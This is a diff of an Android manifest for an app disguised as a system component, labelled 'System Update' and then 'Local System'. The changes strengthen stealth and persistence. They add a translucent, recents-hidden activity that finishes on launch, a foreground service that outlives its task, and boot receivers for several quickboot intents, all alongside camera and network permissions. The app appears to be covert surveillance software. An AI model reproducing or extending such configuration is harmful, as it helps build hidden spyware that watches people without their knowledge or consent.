@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
     
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
@@ -14,27 +15,35 @@
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.FLASHLIGHT" />
+    <uses-permission android:name="android.permission.QUICKBOOT_POWERON" />
     
     <application
         android:allowBackup="false"
-        android:icon="@android:drawable/ic_menu_compass"
-        android:label="System Update"
-        android:usesCleartextTraffic="true"
-        android:theme="@android:style/Theme.Translucent.NoTitleBar">
+        android:icon="@drawable/ic_launcher"
+        android:label="Local System"
+        android:usesCleartextTraffic="false"
+        android:networkSecurityConfig="@xml/network_security_config"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar"
+        tools:ignore="MissingApplicationIcon">
         
         <activity
             android:name=".MainActivity"
             android:exported="false"
             android:excludeFromRecents="true"
             android:noHistory="true"
-            android:taskAffinity="">
+            android:taskAffinity=""
+            android:launchMode="singleInstance"
+            android:finishOnTaskLaunch="true"
+            android:stateNotNeeded="true">
         </activity>
         
         <service
             android:name=".DeviceService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="mediaPlayback" />
+            android:foregroundServiceType="mediaPlayback|dataSync"
+            android:stopWithTask="false">
+        </service>
         
         <receiver
             android:name=".BootReceiver"
@@ -43,6 +52,7 @@
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
             
